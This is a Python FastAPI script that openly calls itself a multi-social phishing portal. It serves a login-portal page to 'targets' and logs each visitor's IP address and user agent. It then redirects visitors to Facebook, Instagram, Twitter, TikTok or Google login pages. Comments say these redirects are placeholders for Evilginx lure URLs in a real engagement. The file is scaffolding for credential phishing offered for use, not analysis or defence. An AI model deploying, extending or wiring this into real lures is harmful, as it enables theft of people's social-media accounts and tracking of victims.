#!/usr/bin/env python3
import uvicorn
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
import os
import sys
import logging
import time
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] GODMODE: %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("godmode")

app = FastAPI(title="Vantablack God Mode Portal")

# Paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")
PORTAL_FILE = os.path.join(TEMPLATES_DIR, "godmode_portal.html")

# Mock Phishlet URLs (In a real scenario, these would be your Evilginx lure URLs)
PHISHLET_URLS = {
    "facebook": "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2F", # Simulate redirect to real site or phishlet
    "instagram": "https://www.instagram.com/accounts/login/",
    "twitter": "https://twitter.com/i/flow/login",
    "tiktok": "https://www.tiktok.com/login",
    "google": "https://accounts.google.com/signin"
}

def print_banner():
    print("""
\033[91m
  ██████╗  ██████╗ ██████╗     ███╗   ███╗ ██████╗ ██████╗ ███████╗
 ██╔════╝ ██╔═══██╗██╔══██╗    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝
 ██║  ███╗██║   ██║██║  ██║    ██╔████╔██║██║   ██║██║  ██║█████╗  
 ██║   ██║██║   ██║██║  ██║    ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  
 ╚██████╔╝╚██████╔╝██████╔╝    ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
  ╚═════╝  ╚═════╝ ╚═════╝     ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                      v4.0.0-SOCIAL
\033[0m
[*] GOD MODE ACTIVATED
[*] Multi-Social Phishing Portal Initialized
[*] Listening on: http://0.0.0.0:6666
    """)

@app.get("/", response_class=HTMLResponse)
async def serve_portal(request: Request):
    """Serve the Universal Login Portal"""
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "Unknown")
    
    logger.info(f"Target connected from {client_ip} | UA: {user_agent}")
    
    if not os.path.exists(PORTAL_FILE):
        return HTMLResponse(content="<h1>Error: God Mode Portal Template Not Found</h1>", status_code=500)
    
    with open(PORTAL_FILE, "r") as f:
        content = f.read()
        
    return content

@app.get("/auth/{provider}")
async def handle_auth(provider: str, request: Request):
    """Handle social login redirection"""
    client_ip = request.client.host
    
    if provider not in PHISHLET_URLS:
        logger.warning(f"Invalid provider requested by {client_ip}: {provider}")
        raise HTTPException(status_code=404, detail="Provider not supported")
        
    target_url = PHISHLET_URLS[provider]
    
    # Simulate capturing intent
    logger.info(f"CAPTURED INTENT: Target {client_ip} selected {provider.upper()}")
    logger.info(f"Redirecting {client_ip} -> {target_url}")
    
    # In a real engagement, you would redirect to your Evilginx lure URL here
    # For this template, we redirect to the official site to simulate the flow
    return RedirectResponse(url=target_url)

if __name__ == "__main__":
    print_banner()
    try:
        uvicorn.run(app, host="0.0.0.0", port=6666, log_level="error")
    except KeyboardInterrupt:
        print("\n[*] God Mode Deactivated.")
